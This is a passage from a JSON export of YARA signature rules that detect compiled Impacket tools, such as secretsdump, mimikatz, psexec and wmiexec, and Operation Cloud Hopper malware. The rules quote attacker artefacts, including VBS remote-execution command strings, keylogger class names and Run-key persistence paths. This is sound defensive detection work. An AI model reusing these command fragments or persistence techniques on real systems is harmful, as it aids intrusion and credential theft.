Tools","minimum_yara":"1.7","name":"karmaSMB_RID29FF","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"92fe607b1b475a931f14d8b0a69ea5ce","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule samrdump_RID2A7A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 06:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"bsamrdump_RID2A7A.exe.manifest\" fullword ascii\n      $s3 = \"ssamrdump_RID2A7A\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 06:15:01","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"samrdump_RID2A7A","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"5e96e0b06512d99abb7eafb98ba5b41d","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_rpcdump_RID3009 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"srpcdump\" fullword ascii\n      $s2 = \"impacket.dcerpc.v5.epm(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 12:22:41","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_rpcdump_RID3009","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"7e7a35ee6029c30299b6975278e407c8","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_secretsdump_RID31BD : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 13:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssecretsdump\" fullword ascii\n      $s2 = \"impacket.ese(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 13:35:21","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_secretsdump_RID31BD","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"8949ccb9e0a4e7f0a3a71f9b374bdb52","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_esentutl_RID3082 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.ese(\" fullword ascii\n      $s2 = \"sesentutl\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 11000KB and all of them )\n}","date":"2017-04-07 12:42:51","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_esentutl_RID3082","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"e741c8017df9a7f359ab553a487a4969","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_opdump_RID2FA3 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"bopdump.exe.manifest\" fullword ascii\n      $s3 = \"sopdump\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 12:05:41","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_opdump_RID2FA3","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"119f3e401c8a9daef44f2681d527f86b","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_sniff_RID2F24 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 11:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssniff\" fullword ascii\n      $s2 = \"impacket.eap(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}","date":"2017-04-07 11:44:31","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_sniff_RID2F24","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"6aafe17062bcf2aaa3f5dd5e9cdbd1a1","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_smbexec_RID2FF5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"logging.config(\" fullword ascii\n      $s2 = \"ssmbexec\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 12:19:21","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_smbexec_RID2FF5","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"4b15ba763aee4a637c946c50161e95cf","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_smbtorture_RID3165 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 13:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket\" fullword ascii\n      $s2 = \"ssmbtorture\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 13:20:41","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_smbtorture_RID3165","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"9999e1f8392c0e05f54d846b3a6a458f","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_wmipersist_RID3165 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 13:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"swmipersist\" fullword ascii\n      $s2 = \"\\\\yzHPlU=QA\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 13:20:41","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_wmipersist_RID3165","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"a74782085f2f6709e64ac5e99b402551","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_lookupsid_RID30E8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:59:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"slookupsid\" fullword ascii\n      $s2 = \"impacket.dcerpc\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}","date":"2017-04-07 12:59:51","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_lookupsid_RID30E8","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"099abe272f1f4f38f63f5940d46ace4b","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_wmiquery_RID3091 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"swmiquery\" fullword ascii\n      $s2 = \"\\\\yzHPlU=QA\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 12:45:21","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_wmiquery_RID3091","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"965594c199c2279f786f8b76539e07cb","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_lockdown_RID2FF5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Tools related to Operation Cloud Hopper\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"lockdown.dll\" fullword ascii\n      $s3 = \"mfeann.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-07 12:19:21","description":"Tools related to Operation Cloud Hopper","minimum_yara":"1.7","name":"OpCloudHopper_lockdown_RID2FF5","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"1df60a216615f2c98713ffea3bc753c4","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule OpCloudHopper_WmiDLL_inMemory_RID324C : APT DEMO MAL {\n   meta:\n      description = \"Malware related to Operation Cloud Hopper - Page 25\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 13:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wmi.dll 2>&1\" ascii\n   condition: \n      all of them\n}","date":"2017-04-07 13:59:11","description":"Malware related to Operation Cloud Hopper - Page 25","minimum_yara":"1.7","name":"OpCloudHopper_WmiDLL_inMemory_RID324C","reference":"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf","required_modules":[],"rule_hash":"23943bd8750e354dd929bb361314f22b","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_tracer_RID2F8F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"btk85.dll\" fullword ascii\n      $s2 = \"btcl85.dll\" fullword ascii\n      $s3 = \"xtk\\\\unsupported.tcl\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 21000KB and all of them )\n}","date":"2017-04-07 12:02:21","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_tracer_RID2F8F","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"a9160c997fbd60d2a45987a30d56b968","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_wmiexec_RID3000 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bwmiexec.exe.manifest\" fullword ascii\n      $s2 = \"swmiexec\" fullword ascii\n      $s3 = \"\\\\yzHPlU=QA\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 2 of them )\n}","date":"2017-04-07 12:21:11","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_wmiexec_RID3000","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"f9cbdb578991f08080256653d6606f83","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_goldenPac_RID309B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.examples.serviceinstall(\" fullword ascii\n      $s2 = \"bgoldenPac.exe\" fullword ascii\n      $s3 = \"json.scanner(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 12:47:01","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_goldenPac_RID309B","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"9cd96d037e21f0e56a591e90a3d32777","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_netview_RID3010 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.dcerpc.v5.wkst(\" fullword ascii\n      $s2 = \"dummy_threading(\" fullword ascii\n      $s3 = \"snetview\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 12:23:51","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_netview_RID3010","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"65e85c10b30e3ac7993b9e16ccbb2626","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_mimikatz_RID3074 : DEMO EXE FILE HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:40:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket\" fullword ascii\n      $s2 = \"smimikatz\" fullword ascii\n      $s3 = \"otwsdlc\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 12:40:31","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_mimikatz_RID3074","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"7f62c6e0fe87b53de0476abab475e3c5","score":75,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_smbrelayx_RID30E5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.examples.secretsdump\" fullword ascii\n      $s2 = \"impacket.examples.serviceinstall\" fullword ascii\n      $s3 = \"impacket.smbserver(\" fullword ascii\n      $s4 = \"SimpleHTTPServer(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and 3 of them )\n}","date":"2017-04-07 12:59:21","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_smbrelayx_RID30E5","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"9e99d921d1b8c832d88041da447c3089","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_atexec_RID2F88 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"batexec.exe.manifest\" fullword ascii\n      $s2 = \"satexec\" fullword ascii\n      $s3 = \"impacket.dcerpc\" fullword ascii\n      $s4 = \"# CSZq\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 3 of them )\n}","date":"2017-04-07 12:01:11","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_atexec_RID2F88","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"3b367a5f7a76e0f5e91a206f5eaac957","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_psexec_RID2F96 : DEMO EXE FILE HKTL T1035 {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1035\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.examples.serviceinstall(\" fullword ascii\n      $s2 = \"spsexec\" fullword ascii\n      $s3 = \"impacket.examples.remcomsvc(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 2 of them )\n}","date":"2017-04-07 12:03:31","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_psexec_RID2F96","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"002228094a299d2fd9a38a5ebee4e8a9","score":75,"tags":["DEMO","EXE","T1035","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_Generic_1_RID305B : DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:36:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bpywintypes27.dll\" fullword ascii\n      $s2 = \"hZFtPC\" fullword ascii\n      $s3 = \"impacket\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 21000KB and all of ( $s* ) ) or ( all of them )\n}","date":"2017-04-07 12:36:21","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_Generic_1_RID305B","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"752c3234f23dafbc777de088ea5c362a","score":75,"tags":["DEMO","EXE","GEN","FILE","HKTL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_WindowXarBot_RID315C : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware related to Operation Cloud Hopper\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 13:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\WindowXarbot.pdb\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-07 13:19:11","description":"Malware related to Operation Cloud Hopper","minimum_yara":"1.7","name":"OpCloudHopper_WindowXarBot_RID315C","reference":"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf","required_modules":[],"rule_hash":"9d87d471cea4b438d4b9a25c0dddd4f4","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule VBS_WMIExec_Tool_Apr17_1_RID2F44 : APT DEMO SCRIPT {\n   meta:\n      description = \"Tools related to Operation Cloud Hopper\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"strNetUse = \\\"cmd.exe /c net use \\\\\\\\\\\" & host\" fullword ascii\n      $x2 = \"localcmd = \\\"cmd.exe /c \\\" & command \" ascii\n      $x3 = \"& \\\" > \\\" & TempFile & \\\" 2>&1\\\"  '2>&1 err\" fullword ascii\n      $x4 = \"strExec = \\\"cmd.exe /c \\\" & cmd & \\\" >> \\\" & resultfile & \\\" 2>&1\\\"  '2>&1 err\" fullword ascii\n      $x5 = \"TempFile = objShell.ExpandEnvironmentStrings(\\\"%TEMP%\\\") & \\\"\\\\wmi.dll\\\"\" fullword ascii\n      $a1 = \"WMIEXEC ERROR: Command -> \" ascii\n      $a2 = \"WMIEXEC : Command result will output to\" fullword ascii\n      $a3 = \"WMIEXEC : Target ->\" fullword ascii\n      $a4 = \"WMIEXEC : Login -> OK\" fullword ascii\n      $a5 = \"WMIEXEC : Process created. PID:\" fullword ascii\n   condition: \n      ( filesize < 40KB and 1 of them ) or 3 of them\n}","date":"2017-04-07 11:49:51","description":"Tools related to Operation Cloud Hopper","minimum_yara":"1.7","name":"VBS_WMIExec_Tool_Apr17_1_RID2F44","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"1f5e0ae048d3984556ffaa80a0e15bbb","score":75,"tags":["APT","DEMO","SCRIPT"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_1_RID2FED : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n      $s2 = \"z{[ZZYUKKKIIGGGGGGGGGGGGG\" fullword ascii\n      $s3 = \"EEECEEC\" fullword ascii\n      $s4 = \"IIEFEE\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-03 12:18:01","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_1_RID2FED","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"08f288ce233e219281ac8b265490a245","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_2_RID2FEE : DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"sERvEr.Dll\" fullword ascii\n      $x2 = \"ToolbarF.dll\" fullword wide\n      $x3 = \".?AVCKeyLoggerManager@@\" fullword ascii\n      $x4 = \"GH0STCZH\" ascii\n      $s1 = \"%%SystemRoot%%\\\\System32\\\\svchost.exe -k \\\"%s\\\"\" fullword wide\n      $s2 = \"rundll32.exe \\\"%s\\\", UnInstall /update %s\" fullword wide\n      $s3 = \"\\\\Release\\\\Loader.pdb\" fullword ascii\n      $s4 = \"%s\\\\%x.dll\" fullword wide\n      $s5 = \"Mozilla/4.0 (compatible)\" fullword wide\n      $s6 = \"\\\\syslog.dat\" fullword wide\n      $s7 = \"NSOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword wide\n      $op1 = { 8d 34 17 8d 49 00 8a 14 0e 3a 14 29 75 05 41 3b } \n      $op2 = { 83 e8 14 78 cf c1 e0 06 8b f8 8b c3 8a 08 84 c9 } \n      $op3 = { 3b fb 7d 3f 8a 4d 14 8d 45 14 84 c9 74 1b 8a 14 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) or all of ( $op* ) ) or ( 6 of them )\n}","date":"2017-04-03 12:18:11","description":"Detects Operation CloudHopper malware 